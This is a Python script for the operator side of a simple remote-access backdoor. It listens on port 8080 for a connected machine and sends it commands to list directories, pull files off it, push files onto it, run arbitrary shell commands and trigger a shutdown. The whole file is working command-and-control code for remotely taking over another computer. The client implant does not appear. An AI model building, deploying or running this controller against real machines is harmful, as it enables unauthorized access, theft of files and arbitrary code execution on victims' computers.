import os
import socket

s = socket.socket()
# hostname: LAPTOP-O8V292V7
host = socket.gethostname()
# host = "192.168.174.189"
host = ""
port = 8080
s.bind((host,port))
print(" Server is currently running at ", host)
print(" Waiting for incoming connections... ")
s.listen()
conn, addr = s.accept()
print(addr, " has connected to the server successfully ")

while True:
    command = input(str("Command >> "))
    conn.send(command.encode())

    if command == "view_cwd":
        print("Command sent waiting for execution")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output: ", files)
    elif command == "custom_dir":
        print("Command sent waiting for execution")
        filepath = input(str("Enter the filepath that you want to list: "))
        conn.send(filepath.encode())
        files = conn.recv(5000).decode()
        print("Command output: ", files)
    
    elif command == "download_file":
        print("Command sent waiting for execution")
        filepath = input(str("Enter the filepath(including name) of the file you want to download: "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        filename = input(str("input the name of the downloaded file(including extension): "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print(filename, " has been downloaded and saved")
    elif command == "upload_file":
        # print("Command sent waiting for execution")
        filepath = input(str("Enter the filepath of the file you want to upload:"))
        file = open(filepath, "rb")
        data = file.read()
        send_path = input(str("Enter the file where you want to download: "))
        conn.send(data)
        conn.send(send_path.encode())
    elif command == "custom_command":
        cmd = input(str("Custom Command(note, this might require admin priviledges): "))
        conn.send(cmd.encode())
        output = conn.recv(100000).decode()
        print("Command Output: ", output)
        
        # print("Command executed")
    elif command == "shutdown":
        print("Command sent waiting for execution")
        sec = input(str("Enter the number of seconds to delay: "))
        conn.send(sec.encode())

        print("Command executed")
    elif command == "kill":
        break
    else:
        print("command not recognized")
    print("")